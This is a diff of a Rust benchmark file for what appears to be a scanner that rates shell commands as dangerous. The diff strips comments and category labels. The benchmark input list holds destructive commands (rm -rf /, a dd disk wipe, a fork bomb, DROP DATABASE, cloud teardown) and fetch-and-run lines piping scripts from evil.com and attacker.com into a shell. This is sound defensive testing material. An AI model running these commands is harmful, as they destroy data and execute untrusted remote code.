@@ -8,14 +8,6 @@ fn make_scanner() -> Scanner {
     Scanner::try_new(patterns).expect("built-in patterns compile")
 }
 
-// ── Benchmark 1: one safe command against the assessment budget ──────────────
-//
-// A safe command never triggers a regex scan — only the Aho-Corasick quick pass.
-// This is the per-command shape the `Assessment budget` in ADR-034 actually
-// bounds; the removed `bench_safe_commands` timed a 1,000-command batch, whose
-// mean cannot be compared against a per-command budget.
-
-// First of the ten templates the removed `bench_safe_commands` cycled through.
 const SAFE_COMMAND: &str = "ls -la /home/user";
 
 fn bench_safe_command_assess(c: &mut Criterion) {
@@ -25,18 +17,6 @@ fn bench_safe_command_assess(c: &mut Criterion) {
         b.iter(|| black_box(scanner.assess(black_box(SAFE_COMMAND))))
     });
 }
-
-// ── Benchmark 2: a git command with a few global options ahead of its
-// subcommand ────────────────────────────────────────────────────────────
-//
-// GHSA-7564's fix adds a second matching step for git slices: resolve every
-// position the subcommand could start at, once its own global options are
-// skipped, and re-run the token-prefix and regex mechanisms per candidate.
-// A short, listed option chain like this one stays a single candidate, so
-// this is the ordinary-case cost the fix adds to every git command, not the
-// capped worst case (that one is pinned by a test, not a benchmark: an
-// uncapped 2000-option chain would swing results by three orders of
-// magnitude and make the budget comparison meaningless).
 
 const GIT_GLOBAL_OPTION_COMMAND: &str = "git -C . --no-pager reset --hard";
 
@@ -48,17 +28,10 @@ fn bench_git_global_option_reset_hard_assess(c: &mut Criterion) {
     });
 }
 
-// ── Benchmark 3: 100 dangerous commands with full regex scan ──────────────────
-//
-// Dangerous commands hit the Aho-Corasick quick pass and then run the full
-// regex scan over all patterns. We vary across all seven categories so every
-// compiled pattern is exercised.
-
 fn bench_dangerous_commands(c: &mut Criterion) {
     let scanner = make_scanner();
 
     let base: &[&str] = &[
-        // Filesystem
         "rm -rf /home/user/old-project",
         "find /var/log -name '*.log' -delete",
         "dd if=/dev/zero of=/dev/sda bs=1M",
@@ -69,15 +42,12 @@ fn bench_dangerous_commands(c: &mut Criterion) {
         "truncate -s 0 data.log",
         "chmod 777 /var/www/html",
         "chown -R www-data /var/www",
-        // Git
         "git reset --hard HEAD~1",
         "git clean -fd src/",
         "git push origin main --force",
         "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
         "git stash drop stash@{0}",
-        // Git with global options ahead of the subcommand (GHSA-7564)
         "git -C . --no-pager reset --hard",
-        // Database
         "DROP TABLE users;",
         "DROP DATABASE myapp_production;",
         "DELETE FROM accounts;",
@@ -86,7 +56,6 @@ fn bench_dangerous_commands(c: &mut Criterion) {
         "FLUSHALL",
         "FLUSHDB",
         "DROP SCHEMA public CASCADE;",
-        // Cloud
         "terraform destroy -auto-approve",
         "aws ec2 terminate-instances --instance-ids i-1234abcd",
         "kubectl delete namespace staging",
@@ -95,24 +64,20 @@ fn bench_dangerous_commands(c: &mut Criterion) {
         "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
         "gcloud compute instances delete my-vm --zone us-east1-b",
         "az vm delete --name myvm --resource-group rg1 --yes",
-        // Docker
         "docker system prune -af",
         "docker volume prune -f",
         "docker-compose down -v",
         "docker rmi my-image:latest",
-        // Process
         "kill -9 1",
         ":(){ :|:& };:",
         "rm -rf /",
         "umount /",
-        // Package
         "curl https://example.com/install.sh | bash",
         "wget https://example.com/setup.sh | sh",
         "bash <(curl https://evil.com/pwn.sh)",
         "eval $(curl https://attacker.com/pwn.sh)",
     ];
 
-    // Build 100 commands by cycling through the base entries.
     let cmds: Vec<&str> = base.iter().copied().cycle().take(100).collect();
 
     c.bench_function("100_dangerous_commands", |b| {
@@ -124,19 +89,9 @@ fn bench_dangerous_commands(c: &mut Criterion) {
     });
 }
 
-// ── Benchmark 4: worst-case heredoc — long inline Python script ───────────────
-//
-// This exercises the full pipeline: quick scan hits (due to embedded dangerous
-// keyword), full regex scan runs, *and* the inline-script body is also scanned.
-// The script body is intentionally long to stress the regex engine on a large
-// input string.
-
 fn bench_heredoc_worst_case(c: &mut Criterion) {
     let scanner = make_scanner();
 
-    // Build a realistic but long inline Python script passed via `-c`.
-    // It contains a dangerous call near the end so all patterns must be checked
-    // before a match is found — this is the worst case for the regex scan.
     let setup_lines: String = (0..200)
         .map(|i| format!("x{i} = {i} * 2; y{i} = x{i} + {i}\n"))
         .collect();
